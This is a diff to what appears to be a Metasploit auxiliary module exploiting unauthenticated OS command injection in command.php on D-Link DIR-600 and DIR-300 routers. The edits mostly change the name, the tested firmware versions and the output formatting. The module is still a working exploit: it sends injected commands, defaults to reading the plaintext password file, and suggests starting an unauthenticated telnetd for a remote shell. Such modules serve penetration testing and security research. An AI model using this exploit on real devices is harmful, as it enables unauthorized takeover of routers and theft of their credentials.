@@ -13,12 +13,13 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'            => 'D-Link DIR-600 rev B / DIR-300 rev B unauthenticated Remote Command Execution in command.php',
+			'Name'            => 'D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution',
 			'Description'     => %q{
-					Some D-Link Routers are vulnerable to OS Command injection.
+					Some D-Link Routers like the DIR-600 rev B and the DIR-300 rev B are 
+				vulnerable to OS Command injection.
 				You do not need credentials to the webinterface because the command.php
 				is accesseble without authentication. You could read the plaintext password
-				file.
+				file. Tested versions: DIR-600 2.14b01 and below, DIR-300 rev B 2.13 and below.
 				Hint: To get a remote shell you could start the telnetd without any authentication. 
 			},
 			'Author'          => [ 'm-1-k-3' ],
@@ -35,14 +36,14 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(80),
-				OptString.new('CMD', [ true, 'The command to execute', 'cat /var/passwd'])
+				OptString.new('CMD', [ true, 'The command to execute', 'cat var/passwd'])
 			], self.class)
 	end
 
 	def run
 		uri = '/command.php'
 
-		print_status("Sending remote command: " + datastore['CMD'])
+		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
 
 		data_cmd = "cmd=#{datastore['CMD']}; echo end"
 
@@ -63,11 +64,11 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		
 		if res.body.include? "end"
-			print_status("Exploited successfully")
-			print_line("Command: #{datastore['CMD']}")
-			print_line("Output: #{res.body}")
+			print_status("#{rhost}:#{rport} - Exploited successfully\n")
+			print_line("#{rhost}:#{rport} - Command: #{datastore['CMD']}\n")
+			print_line("#{rhost}:#{rport} - Output: #{res.body}")
 		else
-			print_status("Exploit failed.")
+			print_status("#{rhost}:#{rport} - Exploit failed.")
 		end
 	end
 end
